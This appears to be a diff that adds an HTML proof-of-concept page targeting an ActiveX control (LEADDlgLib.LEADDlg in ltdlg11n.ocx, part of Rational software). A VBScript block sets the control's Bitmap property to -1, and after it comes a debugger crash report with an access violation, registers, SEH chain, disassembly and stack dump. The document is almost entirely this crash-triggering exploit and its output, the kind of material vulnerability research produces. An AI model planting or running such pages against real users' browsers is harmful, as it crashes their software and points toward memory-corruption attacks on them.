@@ -1,0 +1,78 @@
+<html>
+Test Exploit Page
+<object classid='clsid:00110060-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' /></object>
+<script language='vbscript'>
+targetFile = "C:\Program Files\Rational\common\ltdlg11n.ocx"
+prototype  = "Property Let Bitmap As Long"
+memberName = "Bitmap"
+progid     = "LEADDlgLib.LEADDlg"
+argCount   = 1
+
+arg1=-1
+
+target.Bitmap = arg1
+
+</script>
+
+
+Exception Code: ACCESS_VIOLATION
+Disasm: AA62D2	CMP DWORD PTR [EAX],6461656C
+
+Seh Chain:
+--------------------------------------------------
+1 	73352960 	VBSCRIPT.dll
+2 	7C839AD8 	KERNEL32.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+
+
+Registers:
+--------------------------------------------------
+EIP 00AA62D2
+EAX 00000000
+EBX 7C80FF22 -> A868146A
+ECX 02AB2128 -> 00000000
+EDX 00150608 -> 7C97E5A0
+EDI 02AB2128 -> 00000000
+ESI 02AB1F58 -> 00AB07C0
+EBP FFFFFFFF
+ESP 0013ED98 -> 00AA6292
+
+
+Block Disassembly: 
+--------------------------------------------------
+AA62BE	POP EBX
+AA62BF	RETN 8
+AA62C2	PUSH DWORD PTR [ESP+4]
+AA62C6	CALL [AB00EC]
+AA62CC	MOV ECX,[ESP+8]
+AA62D0	MOV [ECX],EAX
+AA62D2	CMP DWORD PTR [EAX],6461656C	  <--- CRASH
+AA62D8	JE SHORT 00AA62DF
+AA62DA	AND DWORD PTR [ECX],0
+AA62DD	JMP SHORT 00AA62E2
+AA62DF	MOV EAX,[EAX+8]
+AA62E2	RETN 8
+AA62E5	PUSH ESI
+AA62E6	MOV ESI,[ESP+8]
+AA62EA	LEA ECX,[ESI-60]
+
+
+Stack Dump:
+--------------------------------------------------
+13ED98 92 62 AA 00 FF FF FF FF 28 21 AB 02 00 00 00 00  [.b..............]
+13EDA8 AC 60 1A 00 CC ED 13 00 C0 07 AB 00 D9 5C 13 77  [.`...........\.w]
+13EDB8 58 1F AB 02 FF FF FF FF 00 EE 13 00 B0 A0 B1 02  [X...............]
+13EDC8 C0 ED 13 00 5C EE 13 00 E8 62 13 77 58 1F AB 02  [....\....b.wX...]
+13EDD8 60 00 00 00 04 00 00 00 0A 00 00 00 01 00 00 00  [`...............]
+
+
+
+ApiLog
+--------------------------------------------------
+
+***** Installing Hooks *****
+7c821a94     CreateFileA(C:\WINDOWS\system32\rsaenh.dll)
+7c821a94     CreateFileA(C:\WINDOWS\system32\rsaenh.dll)
